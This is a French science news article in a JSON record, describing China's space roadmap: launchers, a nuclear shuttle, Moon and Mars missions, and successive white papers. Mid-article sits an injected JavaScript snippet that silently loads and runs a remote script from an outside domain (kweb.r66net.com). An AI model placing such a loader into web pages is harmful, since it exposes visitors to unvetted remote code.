{"title": "La Chine dévoile ses ambitions spatiales", "newspaper": "Futura Sciences", "author": "Rémy Decourt", "date_publi": "23/11/2017", "content": "La Chine a rendu publique une feuille de route montrant l'étendue de ses ambitions spatiales. Celle-ci est cohérente avec la maturité croissante des activités du pays en la matière. À l'horizon 2040, l'espace ne sera plus vraiment une frontière pour la Chine. L'empire du Milieu pourrait bientôt devenir l'une des deux premières puissances spatiales du monde. Pour accompagner son programme d'exploration habitée et d'utilisation de l'espace et de ses ressources, la Chine a rendu publique une feuille de route allant jusqu'aux années 2040. Rédigée par la  China Aerospace Science and Technology Corporation  (CASC) et publiée par un journal proche du pouvoir ( Global Times ), celle-ci se veut très ambitieuse. Le pays y dévoile sa vision du transport spatial et fixe également toute une série d'objectifs en termes de technologies, de sciences et d'applications spatiales, pour une période allant de 2017 à 2045. La phase de  rattrapage technologique  de la Chine est aujourd'hui terminée, même si certaines technologies spatiales chinoises n'ont pas encore atteint le niveau de développement occidental. Elle lui a permis de devenir une des trois premières puissances spatiales. Aujourd'hui, la Chine veut renforcer sa capacité d'accès à l'espace, en réduire les coûts et se doter d'une infrastructure et d'une économie spatiales, grâce à l'exploitation minière des  astéroïdes . Elle a aussi annoncé un projet de centrale solaire installée dans l'espace. Le drapeau chinois flottant dans l'espace. © CNSA                               Une navette spatiale à propulsion nucléaire Pour cela, la Chine prévoit une large gamme d'engins spatiaux et s'inspire de ce qui se fait ailleurs, notamment aux États-Unis. Elle planifie donc de nombreux systèmes réutilisables comme des étages, des  systèmes de lancement  et des  avions spatiaux , dont au moins un sera dédié au  tourisme spatial .  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Seule surprise, et de taille : l'annonce d'une navette spatiale à propulsion nucléaire pour des missions lointaines. Ce véhicule ne décollera pas de  Terre , car cela est interdit. En revanche, d'ici sa mise en service, la Chine aura établi une permanence humaine dans l'espace et sera allée sur la  Lune  et sur Mars. Très vraisemblablement, elle aura débuté l' exploitation des ressources naturelles  des astéroïdes. Dans ce contexte, elle aura besoin d'un véhicule capable de multiples rotations interplanétaires et de liaisons inter-orbitales pour relier ses colonies et autres bases avancées. L'utilisation de la propulsion nucléaire se justifie pour raccourcir les temps de trajets interplanétaires ou à destination d'astéroïdes. Enfin, pour combler sa gamme de familles de lanceurs, la Chine prévoit d'ici 2020 la mise en service d'un modèle  low cost  (Longue Marche 8), d'un  lanceur  de 5,5 tonnes de performance en  orbite de transfert  géostationnaire (Longue Marche 7) et d'un lanceur capable d'envoyer quelque 13 tonnes, également en GTO ( Longue Marche 5 ). À cela, s'ajoutera, à l'horizon 2030, un lanceur lourd de nouvelle génération avec une capacité de 100 tonnes en  orbite  basse et capable d'envoyer des Hommes sur la Lune. Pour en savoir plus La Chine veut s'aventurer dans le Système solaire Article de  Rémy Decourt  publié le 09/08/2017 Ces prochaines années, la Chine compte bien s'aventurer un peu partout dans le  Système solaire . De la Lune à  Uranus  en passant par  Jupiter , les ambitions spatiales du pays sont impressionnantes. La Chine veut aussi étudier les  ondes gravitationnelles  et rechercher de la vie extraterrestre. Lorsqu'elle a débuté sa conquête spatiale, la Chine accusait cinquante ans de retard par rapport aux États-Unis et à la Russie. Aujourd'hui, la situation a bien changé. Si, dans certaines niches technologiques, le pays accuse encore un certain retard, notamment en raison des règles Itar qui l'empêchent d'utiliser des composants américains, dans d'autres, il est en pointe. C'est par exemple vrai en ce qui concerne la technologie antisatellite ou les communications quantiques. Récemment, une conférence s'est tenue (GLEX 2017) à destination des gouvernements, des agences spatiales, des industriels et des entrepreneurs. Il s'agissait de leur proposer un forum de haut niveau pour échanger, analyser et confronter leurs expériences dans le domaine spatial. Durant cet évènement, la Chine a dévoilé de nouvelles ambitions dans le domaine de l'exploration  robotique  du Système solaire. En début d'année, elle avait donné un aperçu de ce que pourraient être ses missions futures. Ainsi, l'intérêt pour les astéroïdes et Jupiter s'est matérialisé avec l'annonce d'une mission de retour d'échantillons d'un astéroïde et celle de l'envoi d'une sonde à destination de Jupiter et  Ganymède  (2036). Uranus est également une cible pour une mission durant la décennie 2040. Rapporter des échantillons de la Lune et de Mars En 2018, la Chine rapportera des  échantillons lunaires  avec la mission Chang'e 5. Et, si l'on se fie aux dates avancées, dès le début de la décennie 2030, la Chine pourrait être la première nation à amener des échantillons de Mars sur la Terre, bien avant la Nasa. Cela dit, malgré les tergiversations américaines sur le financement d'une mission de retour d'échantillons martiens, il serait très surprenant que les Chinois réussissent cet exploit en premier. D'abord parce qu'ils n'ont pas totalement mis au point les technologies nécessaires à chaque phase de cette mission et, d'autre part, parce que la Nasa a tout de même un temps d'avance. En effet, en 2020, celle-ci lancera le  rover  provisoirement appelé  Mars 2020  qui devra notamment préparer un petit colis d'échantillons qu'une mission ira récupérer plus tard. Ondes gravitationnelles, vie extraterrestre et activités sur la Lune Dans le domaine des sciences spatiales et des études des phénomènes astronomiques les plus violents et énigmatiques, les ambitions de début d'année sont confirmées. À ce qui était prévu (étude de la  matière noire  et des  trous noirs  par exemple), s'ajoute la volonté de mieux comprendre les ondes gravitationnelles et la recherche d'indices de toute forme de vie extraterrestre. On notera aussi que notre satellite naturel est toujours au programme avec des ambitions renforcées, élargies à des missions annonciatrices d' activités humaines sur la Lune . Un nouveau cycle de missions lunaires pourrait se mettre en place avec l'envoi d'atterrisseurs aux pôles et sur la  face cachée . Les ambitions spatiales de la Chine pour les cinq prochaines années Article de Rémy Decourt publié le 02/01/2017 Comme tous les cinq ans, le Livre blanc des activités spatiales de la Chine se révèle être riche d'enseignements sur ses ambitions dans ce domaine. Celui qui vient d'être rendu public pour la période 2017-2022 ne déroge pas à cette règle. S'il permet de se rendre compte des progrès réalisés par la Chine dans ce secteur, il promet aussi pour ces cinq prochaines années des activités spatiales qui devraient renforcer le rôle moteur de la Chine dans l'exploration robotique, l'utilisation de l'espace et l'activité humaine en orbite basse. La Chine vient de publier un nouveau  Livre blanc  dans lequel elle conforte ses ambitions spatiales pour la période 2017-2022. Elle met notamment en avant les programmes déjà engagés dans l'utilisation de l'orbite basse ainsi que l'exploration de la Lune et Mars. Elle prévoit d'accélérer le développement de ses activités spatiales en renforçant les capacités industrielles de son secteur spatial et affiche sa volonté de coopérer avec d'autres pays. Depuis 2011, quelque 43 accords de coopération et partenariat ont été signés avec 29 pays, agences spatiales et organismes internationaux, dont la France et l'Agence spatiale européenne ( ESA ). Dans le domaine des vols habités, la continuité est de mise avec le renforcement de la maitrise de toutes les  technologies liées à cette activité , dans la construction et l'exploitation de sa future station spatiale. Après la maitrise de l'accès à l'espace, du vivre et travailler dans l'espace et du rendez-vous orbital, l'étape suivante est l'apprentissage du pilotage de modules orbitaux avec Tianzou 1, un véhicule automatique dont le premier vol est prévu en 2017. Quant à son idée d'envoyer des  Hommes sur la Lune , malgré que cet objectif n'est pas mentionné, elle y fait tout de même allusion en indiquant que les progrès en matière de vols habités seront utiles à l'exploration de l'espace cislunaire. Deux taïkonautes s'apprêtent à monter à bord d'une capsule Shenzhou. © Reuters, China Daily                               La Lune avant Mars en 2020 Si aujourd'hui la Chine a  Mars en point de mire , ses efforts se concentrent, et se concentreront encore ces prochaines années, sur la Lune avec une mission de retour d'échantillons lunaires (Chang'e 5) en 2017 et un atterrissage sur la  face cachée de notre satellite  (Chang'e 4) en 2018. En 2020, comme les Américains avec Mars 2020 et les Européens avec  ExoMars 2020 , la Chine enverra un rover se poser sur Mars, première étape d'un programme qui se terminera par une mission de retour d'échantillons martiens dans le courant de la décennie 2030. Enfin, et c'est nouveau, elle montre un intérêt grandissant pour les astéroïdes et Jupiter qui seront certainement deux destinations au programme du prochain  Livre blanc . Dans le domaine des sciences spatiales, la  matière noire  est mise en  lumière  avec un satellite dédié à sa recherche ainsi qu'au lancement d'un observatoire dans le X pour étudier la dynamique de la matière et les processus de rayonnement à haute  énergie  dans le champ gravitationnel des objets de l' univers , dont les trous noirs. Ce  Livre blanc  annonce aussi un renforcement du système de positionnement et de navigation Beidou, l'équivalent chinois du  Galileo européen  et du  GPS  américain, de façon à l'étendre au-delà de la sphère régionale de la Chine et lui donner une capacité mondiale avec 35 satellites en orbite à l'horizon 2025. Il précise également les domaines de l'observation de la Terre dans lesquels la Chine devra accroître son autonomie et sa capacité à collecter puis traiter des données satellites. Enfin, il veut un renforcement de l'autonomie chinoise dans le secteur des télécommunications spatiales. Concernant la  surveillance de l'espace et des débris orbitaux , la Chine veut une autonomie de surveillance de son infrastructure spatiale. Comme l'ESA d'ailleurs, elle souhaite moins dépendre du Space Surveillance Sytem américain (Norad) et va accroitre ses capacités de surveillance avec la construction de nouvelles installations au sol. Sans surprise, ce  Livre blanc  tait les activités spatiales militaires de la Chine, très active dans ce domaine. Note :  Depuis 1956, date du début de ses activités spatiales, la Chine est devenue la deuxième ou troisième puissance spatiale au monde. Derrière les États-Unis, faisant jeu égal avec la Russie et devant l'Agence spatiale européenne dans le domaine des vols habités. Le début de cette activité s'est matérialisé en 1960 avec le lancement d'un premier  missile  dénommé Dong Fang-1, une copie du missile soviétique R-2 et de la fusée-sonde T-7M, à usage scientifique. Elle devient une puissance spatiale en 1970, avec le succès du tir du lanceur à trois étages CZ-1 et la mise en orbite de son premier satellite (Dongfang hong). En 2003, elle devient la troisième nation au monde capable d'envoyer un  astronaute  dans l'espace. Le petit livre blanc 2012-2016 promet des Chinois sur la Lune Article de Rémy Decourt publié le 03/01/2012 La Chine vient de rendre publiques ses ambitions spatiales pour les cinq prochaines années. Dans le domaine des vols habités et des moyens d'accès à l'espace, les ambitions sont très élevées. Dans son  Livre blanc , la Chine a dévoilé ses priorités spatiales pour la période 2012-2016. Concernant les vols habités, en plus du développement de trois nouveaux lanceurs - y compris un système de lancement à déploiement rapide -, ce pays va conduire des études préliminaires en vue d'envoyer des  Hommes sur la Lune . La Chine va donc étoffer son  programme lunaire , qui comprend déjà des sondes des atterrisseurs, des  rovers  et des missions de retour d'échantillons, avec des missions habitées d'ici une vingtaine d'années. Alors que les grandes agences spatiales se détournent de la Lune au profit des  astéroïdes et de Mars , on peut se demander ce qui se pousse la Chine dans cette direction. Comme l'explique   Isabelle Sourbès-Verger , géographe et spécialiste des politiques spatiales au CNRS, « comme toutes les puissances spatiales, les Chinois ont besoin de se fixer des objectifs ambitieux pour créer une dynamique. Comme il est exclu pour le moment d'aller sur Mars et que la Terre n'a qu'un seul satellite, le choix des destinations est plutôt restreint... » Cela dit, s'il ne fait guère de doute que les bases de ce programme seront scientifiques et économiques, à long terme, l'utilisation des ressources lunaires est une des grandes priorités de la Chine. En effet, la Lune abrite un  gaz  rare sur Terre, l'hélium-3, qui peut être utilisé pour la (future)  fusion nucléaire . D'après certains scientifiques, il se trouve en quantité suffisante pour alimenter la Terre en énergie pendant des siècles... pour peu qu'on soit capable de l'extraire et de l'utiliser. C'est pourquoi l'un des objectifs de la  sonde Chang’e 1  consistait à cartographier la distribution de l'hélium-3 sur la surface lunaire. Près de 100.000 tonnes seraient présentes sur la Lune à une profondeur moyenne de 5 à 6 mètres. À l'instar du programme Apollo qui avait permis aux États-Unis de faire un bond en avant dans de nombreux domaines (technologiques, économiques), la Chine compte faire de même avec sa décision de mettre en place des études préliminaires en vue d'envoyer des Hommes sur la Lune. © CNSA                               Sécuriser l'accès à l'espace Quant aux futurs lanceurs, les projets visent autant à percer sur le marché des lancements commerciaux qu'à sécuriser l'accès à l'espace, quelle que soit la charge utile à lancer et l'orbite visée. Pour ce faire, la Chine planifie trois nouveaux lanceurs, dont le  Longue Marche 5  déjà en développement. Ce futur lanceur lourd sera capable de lancer 25 tonnes de charge utile en orbite basse ou 14 tonnes en orbite de transfert géostationnaire. Il pourra donc lancer les modules de la future  station spatiale chinoise  dont un des premiers éléments précurseurs est déjà en orbite. Le Longue Marche 7, lui, sera conçu pour lancer 5,5 tonnes sur une orbite  héliosynchrone  à une altitude de 700 km. Quant au troisième lanceur, le Longue Marche 6, il s'agit d'un système de transport spatial à déploiement rapide capable de lancer 1 tonne de charge utile en orbite héliosynchrone à une altitude de 700 km. Enfin, malgré l'existence de trois sites de lancement (Jiuquan, Xichang and Taiyuan), la Chine poursuivra la construction d'une quatrième base de lancement, sur l'île de Hainan. Ce sera le premier situé près d'un rivage et non dans des régions désertiques de l'intérieur. Elle sera notamment utilisée pour lancer les futures missions habitées à destination de la  Lune . ", "theme": "sciences"}